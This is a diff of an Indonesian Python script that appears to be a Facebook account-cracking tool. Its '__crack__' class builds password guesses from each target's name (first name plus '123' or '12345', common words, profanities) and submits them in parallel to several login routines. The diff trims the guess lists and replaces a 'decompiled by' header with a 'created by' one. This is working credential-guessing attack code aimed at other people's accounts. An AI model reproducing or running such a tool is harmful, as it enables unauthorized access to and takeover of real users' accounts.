@@ -1,21 +1,21 @@
-# Decompile by Aang Ardiansyah-XD
-# with (uncompyle6) version : 3.7.4
-# Time Succes decompile : 2022-01-03 13:36:30.746764
+l#!/usr/bin/python3 
+#-*-coding:utf-8-*- 
+#Create By Aang Ardiansyah-XD
 import os
 try:
     import requests
 except ImportError:
-    print('\n [×] Modul requests belum terinstall!...\n')
+    print('\n[×] Modul requests belum terinstall !!...\n')
     os.system('pip install requests')
 try:
     import concurrent.futures
 except ImportError:
-    print('\n [×] Modul Futures belum terinstall!...\n')
+    print('\n[×] Modul Futures belum terinstal !!...\n')
     os.system('pip install futures')
 try:
     import bs4
 except ImportError:
-    print('\n [×] Modul Bs4 belum terinstall!...\n')
+    print('\n[×] Modul Bs4 belum terinstal !!...\n')
     os.system('pip install bs4')
 import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
@@ -795,9 +795,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         kirim.submit(self.__api__, uid, pwx)
                     except:
                         pass
@@ -812,9 +812,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         kirim.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
@@ -829,9 +829,9 @@ class __crack__:
                         uid, name = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         else:
-                            pwx = [name, xz[0]+"234", xz[0]+"123", xz[0]+"12345", "kontol", "sayang", "anjing"]
+                            pwx = [name, xz[0]+"123", xz[0]+"12345", "kontol", "sayang"]
                         kirim.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
